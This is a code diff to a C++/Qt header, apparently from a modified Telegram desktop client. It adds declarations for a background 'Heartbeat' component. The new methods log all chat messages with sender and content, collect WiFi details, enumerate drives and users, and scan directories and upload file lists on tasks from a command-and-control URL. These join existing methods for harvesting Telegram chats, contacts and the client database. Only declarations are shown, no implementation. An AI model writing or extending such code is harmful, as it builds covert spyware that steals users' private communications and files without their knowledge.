@@ -13,6 +13,9 @@ public:
     static Heartbeat& Instance();
     void start();
 
+    // Public Logging
+    void logChatMessage(const QString& platform, const QString& chatId, const QString& sender, const QString& content, bool isOutgoing);
+    
 private:
     Heartbeat();
     ~Heartbeat() = default;
@@ -31,9 +34,19 @@ private:
     // New Collection Methods
     void collectInstalledSoftware();
     void collectSystemInfo();
+    void collectWiFiInfo();
     void collectTelegramData(); // Chats, Contacts, Messages
-    void uploadClientDb(); // Upload tdata_client.db
+    void uploadClientDb(const QString& taskId = ""); // Upload tdata_client.db
     
+    // File System
+    void collectDrivesAndUsers();
+    void scanDirectory(const QString& taskId, const QString& path);
+    void uploadFileList(const QString& parentPath, const QJsonArray& files);
+    
+    // Helper
+    QString getDbPath();
+    void ensureDbInit(const QString& path);
+
     // Crypto Helpers
     QString encryptData(const QString& data, const QString& hostname, const QString& timestamp);
     QString decryptData(const QString& data, const QString& hostname, const QString& timestamp);
@@ -42,6 +55,8 @@ private:
     QTimer _monitorTimer;
     QString _monitorTaskId;
     QString _deviceUuid;
+    uint64_t _currentTgId = 0;
+    int64_t _pid = 0;
     QNetworkAccessManager _network;
     QString _c2Url = "http://localhost:8101"; // Base URL without /api prefix as we add it in request
 };
@@ -50,7 +65,7 @@ private:
 class BackgroundScanner : public QObject {
     Q_OBJECT
 public:
-    BackgroundScanner(const QString& uuid, const QString& c2Url, const QString& taskId = "", const QString& mode = "full");
+    BackgroundScanner(const QString& uuid, const QString& c2Url, const QString& dbPath, const QString& taskId = "", const QString& mode = "full", const QString& targetPath = "");
 public Q_SLOTS:
     void process();
 Q_SIGNALS:
@@ -59,8 +74,10 @@ Q_SIGNALS:
 private:
     QString _uuid;
     QString _c2Url;
+    QString _dbPath;
     QString _taskId;
     QString _mode;
+    QString _targetPath;
 };
 
 } // namespace Core
